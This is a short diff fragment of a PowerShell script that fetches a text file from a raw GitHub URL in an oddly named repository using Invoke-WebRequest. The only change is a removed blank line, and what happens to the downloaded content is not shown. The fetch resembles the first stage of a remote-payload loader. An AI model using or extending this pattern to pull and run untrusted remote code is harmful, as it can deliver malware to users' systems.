@@ -1,4 +1,3 @@
-
 $url = "https://raw.githubusercontent.com/HeadShotXx/dxdasaxdsacdsadsacdsxdasacdaxsdcsdaxsadaxdscsa/main/deneme.txt"
 
 $response = Invoke-WebRequest -Uri $url -UseBasicParsing
